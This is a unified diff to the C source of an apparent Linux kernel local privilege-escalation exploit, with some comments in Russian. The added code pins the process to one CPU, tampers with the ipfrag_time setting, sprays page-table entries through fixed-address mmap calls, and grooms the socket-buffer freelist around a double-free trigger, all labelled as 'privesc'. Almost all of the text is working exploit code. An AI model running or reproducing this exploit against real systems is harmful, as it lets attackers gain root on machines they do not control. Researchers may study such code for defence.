@@ -51,6 +51,41 @@ static void alloc_intermed_buf_hdr(size_t dfsize, struct ip *ip_header)
 	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x00');
 }
 
+//блокировка потока на одном ядре
+static void pin_cpu(int cpu_id) {
+    cpu_set_t mask;
+
+    CPU_ZERO(&mask); // очищает набор процессоров
+    CPU_SET(cpu_id, &mask); // выставить бит отображающий CPU x
+
+    if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) { //устанавливает и получает процессорную маску соответствия для процесса
+        perror("sched_setaffinity");
+        exit(1); 
+    } 
+}
+
+
+static void set_ipfrag_time(unsigned int seconds)
+{
+	int fd;
+	
+	fd = open("/proc/sys/net/ipv4/ipfrag_time", O_WRONLY);
+	if (fd < 0) {
+		perror("open$ipfrag_time");
+		exit(1);
+	}
+
+	dprintf(fd, "%u\n", seconds);
+	close(fd);
+}
+
+static void alloc_ipv4_udp(size_t content_size)
+{
+	PRINTF_VERBOSE("[*] sending udp packet...\n");
+	memset(intermed_buf, '\x00', content_size);
+	send_ipv4_udp(intermed_buf, content_size);
+}
+
 
 
 static void privesc_flh_bypass_no_time()
@@ -68,8 +103,37 @@ static void privesc_flh_bypass_no_time()
 		.ip_dst.s_addr = inet_addr("255.255.255.255"),
 	};
 
+	printf("[+] running normal privesc\n");
+
+    PRINTF_VERBOSE("[*] doing first useless allocs to setup caching and stuff...\n");
+
+	pin_cpu(0);
+
+	// allocate PUD (and a PMD+PTE) for PMD
+	mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	*(unsigned long long*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;
+
+	// pre-register sprayed PTEs, with 0x1000 * 2, so 2 PTEs fit inside when overlapping with PMD
+	// needs to be minimal since VMA registration costs memory
+	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
+	{
+		void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+		if (retv == MAP_FAILED)
+		{
+			perror("mmap");
+			exit(EXIT_FAILURE);
+		}
+	}
+
+	// pre-allocate PMDs for sprayed PTEs
+	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children
+	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
+		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;
+	
 	populate_sockets();
 
+	set_ipfrag_time(1);
 
 	// cause socket/networking-related objects to be allocated
 	df_ip_header.ip_id = 0x1336;
@@ -77,16 +141,24 @@ static void privesc_flh_bypass_no_time()
 	df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
 	alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);
 
+	set_ipfrag_time(9999);
 
 	printf("[*] waiting for the calm before the storm...\n");
 	sleep(CONFIG_SEC_BEFORE_STORM);
+
+	// pop N skbs from skb freelist
+	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
+	{
+		PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
+		alloc_ipv4_udp(1);
+	}
 
 	// allocate and free 1 skb from freelist
 	df_ip_header.ip_id = 0x1337;
 	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
 	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
 	trigger_double_free_hdr(32768 + 8, &df_ip_header);
-		
+	
 	// push N skbs to skb freelist
 	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
 	{
